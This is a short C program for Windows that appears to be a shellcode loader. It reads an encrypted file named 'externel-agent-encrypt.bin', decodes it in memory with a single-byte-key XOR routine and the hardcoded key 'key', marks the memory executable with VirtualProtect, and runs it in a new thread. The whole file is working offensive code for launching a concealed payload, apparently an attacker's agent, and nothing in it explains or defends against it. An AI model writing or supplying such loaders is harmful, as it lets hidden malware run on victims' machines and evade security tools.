#include <windows.h>

void Xor(char* data, size_t data_len, char* key, size_t key_len)
{
    for (size_t i = 0; i < data_len; i++)
    {
        data[i] ^= key[i % key_len];
    }
}

int main() {
    void* exec_mem;
    BOOL rv;
    HANDLE th;
    HANDLE hFile = NULL;
    LARGE_INTEGER fileSize = { 0 };
    DWORD bytesRead = NULL;
    DWORD oldprotect = NULL;

    char key[] = "key";

    hFile = CreateFileA("externel-agent-encrypt.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return -1;
    }

    if (GetFileSizeEx(hFile, &fileSize) == 0) {
        return -1;
    }

    exec_mem = VirtualAlloc(0, fileSize.LowPart, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!ReadFile(hFile, exec_mem, fileSize.LowPart, &bytesRead, NULL)) {
        return -1;
    }

    Xor((char*)exec_mem, fileSize.LowPart, key, strlen(key));

    rv = VirtualProtect(exec_mem, fileSize.LowPart, PAGE_EXECUTE_READ, &oldprotect);

    if (rv != 0) {
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }
    return 0;
}